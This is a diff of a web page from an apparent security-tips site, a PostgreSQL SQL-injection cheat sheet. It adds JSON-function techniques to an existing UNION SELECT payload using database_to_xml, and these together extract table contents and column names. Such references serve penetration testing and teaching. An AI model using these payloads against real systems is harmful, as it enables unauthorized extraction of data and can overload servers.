@@ -7,8 +7,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  
-  
+  <meta name="description" content="PostgreSQL commands to extract data while exploiting SQL injection">
+  <meta name="keywords" content="postgresql, sql, sql-injection">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -186,7 +186,15 @@
     
     <ul>
     
-        <li><a class="" href="#injection-sql">Injection SQL</a></li>
+        <li><a class="" href="#cheat-sheet">Cheat Sheet</a></li>
+    
+        <li><a class="" href="#xml-functions">XML functions</a></li>
+    
+        <li><a class="" href="#json-functions">JSON functions</a></li>
+    
+        <li><a class="" href="#to_jsonb-extract-line-as-a-json-object">to_jsonb - extract line as a JSON object</a></li>
+    
+        <li><a class="" href="#jsonb_object_keys-extract-columns-names">jsonb_object_keys - extract columns names</a></li>
     
     </ul>
     
@@ -374,11 +382,10 @@
         <div role="main">
           <div class="section">
             
-              <h1></h1>
-              <h1 id="postgresql">PostgreSQL</h1>
-<h2 id="injection-sql">Injection SQL</h2>
+              <h1>PostgreSQL</h1>
+              <h2 id="injection-sql">Injection SQL</h2>
 <h3 id="cheat-sheet">Cheat Sheet</h3>
-<p>Here is some userfull commands to deal with SQL injection:</p>
+<p>Here is some useful commands to deal with SQL injection:</p>
 <table>
 <thead>
 <tr>
@@ -434,7 +441,7 @@
 </tbody>
 </table>
 <h3 id="xml-functions">XML functions</h3>
-<h4 id="query_to_xml-and">query_to_xml and</h4>
+<h4 id="query_to_xml">query_to_xml</h4>
 <p>The following functions map the contents of relational tables to XML values:</p>
 <pre><code class="language-sql">query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)
 table_to_xml(tbl regclass, nulls boolean, tableforest boolean, targetns text)
@@ -451,6 +458,14 @@ single string:</p>
 <p>The exploitation is as follow. Be careful the process may timeout or DOS the
 server:</p>
 <pre><code class="language-sql">... UNION SELECT '1', '2', database_to_xml(true, true, ''), '4', ...
+</code></pre>
+<h3 id="json-functions">JSON functions</h3>
+<p>PostgreSQL implements JSON functions to interact with this data structure.</p>
+<h3 id="to_jsonb-extract-line-as-a-json-object">to_jsonb - extract line as a JSON object</h3>
+<pre><code class="language-sql">SELECT to_jsonb(t.*) FROM my_table t;
+</code></pre>
+<h3 id="jsonb_object_keys-extract-columns-names">jsonb_object_keys - extract columns names</h3>
+<pre><code class="language-sql">SELECT jsonb_object_keys((SELECT to_jsonb(t.*) FROM my_table t LIMIT 1));
 </code></pre>
             
           </div>
